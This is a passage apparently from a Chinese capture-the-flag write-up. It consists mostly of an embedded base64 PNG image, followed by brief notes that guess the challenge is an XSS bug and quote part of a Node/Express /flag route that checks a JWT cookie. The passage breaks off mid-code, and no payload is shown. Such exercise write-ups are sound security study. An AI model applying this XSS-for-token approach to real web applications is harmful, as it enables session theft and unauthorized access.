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)

这种页面让自己输入一个http相应的话感觉就像是xss

.是把相应渲染到页面上，所以是XSS？ 然后源码中可以看出获取flag的方式为

```js
app.get("/flag", (req, res) => {
    let token = req.cookies.token
    try {
        var decoded = jwt.verify(token, process.env.SECRET)
        if (decoded.id != 2) {
            return res.status(200).send("You are not verified")
        }

